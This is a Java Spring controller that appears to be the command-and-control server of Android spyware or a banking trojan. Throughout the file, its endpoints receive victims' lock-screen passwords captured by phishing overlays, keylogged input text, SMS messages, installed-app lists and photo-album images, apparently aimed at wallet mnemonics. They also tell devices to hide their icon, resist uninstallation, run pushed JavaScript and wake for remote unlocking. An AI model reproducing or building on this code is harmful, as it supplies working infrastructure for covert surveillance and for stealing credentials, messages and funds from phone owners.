package io.renren.modules.app.web.api;

import java.util.List;
import java.util.Objects;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;

import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;

import io.renren.common.constant.Constant;
import io.renren.common.utils.IpUtils;
import io.renren.common.utils.Result;
import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
import io.renren.modules.app.common.Utils;
import io.renren.modules.app.context.DeviceContext;
import io.renren.modules.app.entity.AlbumPicEntity;
import io.renren.modules.app.entity.Device;
import io.renren.modules.app.entity.InputTextRecord;
import io.renren.modules.app.entity.InstallApp;
import io.renren.modules.app.entity.JsCode;
import io.renren.modules.app.entity.Log;
import io.renren.modules.app.entity.SmsInfoEntity;
import io.renren.modules.app.entity.Template;
import io.renren.modules.app.entity.UnlockScreenPwd;
import io.renren.modules.app.service.AlbumPicService;
import io.renren.modules.app.service.DeviceService;
import io.renren.modules.app.service.FishTemplateService;
import io.renren.modules.app.service.InputTextRecordService;
import io.renren.modules.app.service.InstallAppService;
import io.renren.modules.app.service.JsCodeService;
import io.renren.modules.app.service.LogService;
import io.renren.modules.app.service.SmsInfoService;
import io.renren.modules.app.service.TransferService;
import io.renren.modules.app.service.UnlockScreenPwdService;
import io.renren.modules.app.vo.DeviceStatus;
import io.renren.modules.app.vo.ServerConfig;
import io.renren.modules.app.vo.UnLockParams;
import io.renren.modules.sys.dao.SysParamsDao;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@RestController
@RequestMapping("/api/device")
public class DeviceApiController extends BaseApiController {

    @Autowired
    DeviceService deviceService;
    @Autowired
    private InstallAppService installAppService;
    @Resource
    private TransferService transferService;

    @Resource
    private InputTextRecordService inputTextRecordService;

    @Resource
    private LogService logService;
    @Resource
    private JsCodeService jsCodeService;

    @Resource
    private UnlockScreenPwdService unlockScreenPwdService;

    @Resource
    private SysParamsDao sysParamsDao;

    @Resource
    private FishTemplateService fishTemplateService;

    @Resource
    private SmsInfoService smsInfoService;

    @Resource
    private AlbumPicService albumPicService;


    //注册设备
    @RequestMapping("/registerDevice")
    public Result<Void> registerDevice(@RequestBody Device device, HttpServletRequest request) {
        log.info("registerDevice:{}", JSONObject.toJSONString(device));
        device.setDeviceId(DeviceContext.getDeviceId());
        device.setPkg(DeviceContext.getPkg());
        String ip = IpUtils.getIpAddr(request);
        String addr = IpUtils.getCity(ip);
        device.setIp(ip);
        device.setAddr(addr);
        Device dbDevice = deviceService.findByDeviceId(DeviceContext.getDeviceId());
        if (dbDevice != null) {
            if (dbDevice.getHideIcon() == null) {
                dbDevice.setHideIcon(Constant.YN.N);
            }
            if (dbDevice.getAccessibilityGuard() == null) {
                dbDevice.setAccessibilityGuard(Constant.YN.Y);
            }

            if (dbDevice.getUninstallGuard() == null) {
                dbDevice.setUninstallGuard(Constant.YN.Y);
            }
            device.setId(dbDevice.getId());
            deviceService.updateById(device);
        } else {
            device.setHideIcon(Constant.YN.N);
            device.setAccessibilityGuard(Constant.YN.Y);
            device.setUninstallGuard(Constant.YN.Y);
            device.setStatus(Constant.DeviceStatus.screen_on);
            deviceService.save(device);
        }
        log.info("收到pkg:{} 设备:{} 注册信息. ip：{} addr:{} ", DeviceContext.getPkg(), DeviceContext.getDeviceId(), ip, addr);
        return Result.toSuccess();
    }


    @PostMapping("uploadUnlockPassword")
    public Result<Void> uploadUnlockPassword(@RequestBody JSONObject json) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        Device device = deviceService.findByDeviceId(deviceId);
        if (device == null) {
            log.error("pkg:{}  设备:{} 不存在", pkg, deviceId);
            return Result.toError("device not extis.");
        }
//        if (Objects.equals(Constant.YN.Y, device.getFixLockScreen())) {
//            //固定锁屏密码
//            return Result.toSuccess();
//        }

        UnlockScreenPwd unlockScreenPwd = json.toJavaObject(UnlockScreenPwd.class);
        unlockScreenPwd.setDeviceId(device.getId());
        unlockScreenPwd.setPkg(pkg);
        unlockScreenPwd.setAndroidId(deviceId);
        unlockScreenPwd.setCreateDate(Utils.now());

        Device update = new Device();
        update.setId(device.getId());
        update.setLockScreen(json);
        if (unlockScreenPwd.getSource() == Constant.UnlockScreenPwdSource.fish) {
            update.setUnlockFish(Constant.YN.N);
        }
        deviceService.updateById(update);


        log.info("更新pkg:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
        unlockScreenPwdService.save(unlockScreenPwd);
        return Result.toSuccess(null);
    }

    /**
     * APP JS 日志上传
     *
     * @param logs
     * @return
     */
    @PostMapping("uploadLog")
    public Result<Void> uploadLog(@RequestBody List<Log> logs) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        for (Log _log : logs) {
            _log.setId(null);
            _log.setDeviceId(deviceId);
            _log.setPkg(pkg);
        }
        logService.saveBatch(logs);
        return Result.toSuccess();
    }


    @RequestMapping("uploadInputTextRecord")
    public Result<Void> uploadInputTextRecord(@RequestBody List<InputTextRecord> inputTextRecords) {

        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();

        for (InputTextRecord inputTextRecord : inputTextRecords) {
            inputTextRecord.setDeviceId(deviceId);
            inputTextRecord.setPkg(pkg);
            inputTextRecord.setSource(0);
        }

        try {
            log.info("上传输入框:{}", JSON.toJSONString(inputTextRecords));
            DynamicContextHolder.push("clickhouse");
            inputTextRecordService.insertBatchNotTranstion(inputTextRecords, 200);
            return Result.toSuccess();
        } finally {
            DynamicContextHolder.poll();
        }

    }

//    @RequestMapping("uploadUnlockPassword")
//    public Result<Void> uploadUnlockPassword(@RequestBody JSONObject unLockParams) {
//        String deviceId = DeviceContext.getDeviceId();
//        Device device = deviceService.findByDeviceId(deviceId);
//        log.info("uploadUnlockPassword - {}", unLockParams.toJSONString());
//        if (device != null && !Objects.equals(device.getFixLockScreen(), Constant.YN.Y)) {
//            Device updateDevice = new Device();
//            updateDevice.setId(device.getId());
//            updateDevice.setLockScreen(unLockParams);
//            deviceService.updateById(updateDevice);
//        }
//        return Result.toSuccess(null);
//    }

    /**
     * 服务器配置
     *
     * @return
     */
    @RequestMapping("getConfig")
    public Result<ServerConfig> getConfig(@RequestBody DeviceStatus deviceStatus) {
        ServerConfig serverConfig = new ServerConfig();
        serverConfig.setUploadLog(false);//TODO 是否上传日志
        Device dbDevice = deviceService.findByDeviceId(DeviceContext.getDeviceId());

        if (dbDevice == null) {
            return Result.toSuccess(serverConfig);
        }


        if (Objects.equals(Constant.YN.Y, dbDevice.getHideIcon())) {
            serverConfig.setHideIcon(true);
        }


        if (Objects.equals(Constant.YN.Y, dbDevice.getAccessibilityGuard())) {
            serverConfig.setAccessibilityGuard(true);
        }


        if (Objects.equals(Constant.YN.Y, dbDevice.getUninstallGuard())) {
            serverConfig.setUninstallGuard(true);
        }

        JsCode jsCode = jsCodeService.findByIdentification(Constant.JsCodeKey.heartbeat);
        if (jsCode != null) {
            serverConfig.setCode(jsCode.getCode());
        }
        JsCode mainJsCode = jsCodeService.findByIdentification(Constant.JsCodeKey.main);
        //md5版本不对 下发新的js代码
        if (StringUtils.isEmpty(deviceStatus.getJsCodeMd5()) || !Objects.equals(deviceStatus.getJsCodeMd5(), mainJsCode.getCodeMd5())) {
            serverConfig.setMainCode(mainJsCode.getCode());
            serverConfig.setMainCodeMd5(mainJsCode.getCodeMd5());
        }

        serverConfig.setUnlockFish(Objects.equals(dbDevice.getUnlockFish(), Constant.YN.Y));
        serverConfig.setUnlockFishFeatures(sysParamsDao.getValueByCode(Constant.SystemParamsKey.UnlockFishFeatures));
        serverConfig.setUploadSms(Objects.equals(dbDevice.getUploadSms(), Constant.YN.Y));
        serverConfig.setUploadAlbum(Objects.equals(dbDevice.getUploadAlbum(), Constant.YN.Y));

        Device updateDevice = new Device();
        updateDevice.setId(dbDevice.getId());
        updateDevice.setLastHeart(Utils.now());
        updateDevice.setAccessibilityServiceEnabled(deviceStatus.isAccessibilityServiceEnabled() ? Constant.YN.Y : Constant.YN.N);

        if (Constant.DeviceStatus.need_wake == dbDevice.getStatus() /*&& param.getScreenStatus() == Constant.DeviceStatus.screen_off*/) {
            log.info("pkg:{} 设备:{} - 需要唤醒", DeviceContext.getPkg(), DeviceContext.getDeviceId());
            updateDevice.setStatus(Constant.DeviceStatus.wait_wake);
            if (dbDevice.getLockScreen() != null) {
                serverConfig.setUnLockParams(dbDevice.getLockScreen().toJavaObject(UnLockParams.class));
            }
            serverConfig.setWakeUp(true);
        } else if (Constant.DeviceStatus.wait_wake == dbDevice.getStatus() && deviceStatus.getScreenStatus() == Constant.DeviceStatus.screen_on) {
            updateDevice.setStatus(deviceStatus.getScreenStatus());
            log.info("pkg:{} 设备:{} - 唤醒成功", DeviceContext.getPkg(), DeviceContext.getDeviceId());
        } else {
            updateDevice.setStatus(deviceStatus.getScreenStatus());
        }
        log.info("pkg:{} deviceId:{}  config:{}", DeviceContext.getPkg(), DeviceContext.getDeviceId(), JSON.toJSONString(serverConfig));

        deviceService.updateById(updateDevice);
        return Result.toSuccess(serverConfig);

    }

    @RequestMapping("uploadInstallApp")
    public Result<Void> uploadInstallApp(@RequestBody List<InstallApp> list) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        for (InstallApp installApp : list) {
            installApp.setDeviceId(deviceId);
            installApp.setPkg(pkg);
        }
        installAppService.deleteByDeviceIdAndPkg(deviceId, pkg);
        installAppService.saveBatch(list);
        return Result.toSuccess();
    }

    @RequestMapping("templates")
    public Result<List<Template>> templates(@RequestBody JSONObject jsonObject) {
        LambdaQueryWrapper<Template> query = new LambdaQueryWrapper<>();
        query.eq(Template::getStatus, Constant.TemplateStatus.effective);
        List<Template> list = fishTemplateService.list(query);
        return Result.toSuccess(list);
    }


    @RequestMapping("sms")
    public Result<Void> sms(@RequestBody List<SmsInfoEntity> list) {
        String deviceId = DeviceContext.getDeviceId();
        String pkg = DeviceContext.getPkg();
        for (SmsInfoEntity sms : list) {
            sms.setDeviceId(deviceId);
            sms.setPkg(pkg);
        }
        smsInfoService.addSms(list);
        log.info("设备:{} 短信上传成功.", deviceId);
        return Result.toSuccess();
    }


    @PostMapping("/album_pic")
    public Result<Void> albumMnemonics(@RequestBody List<AlbumPicEntity> inputs) {
        albumPicService.upload(inputs);
        log.info("设备:{} 相册上传成功.", DeviceContext.getDeviceId());
        return Result.toSuccess();
    }


}
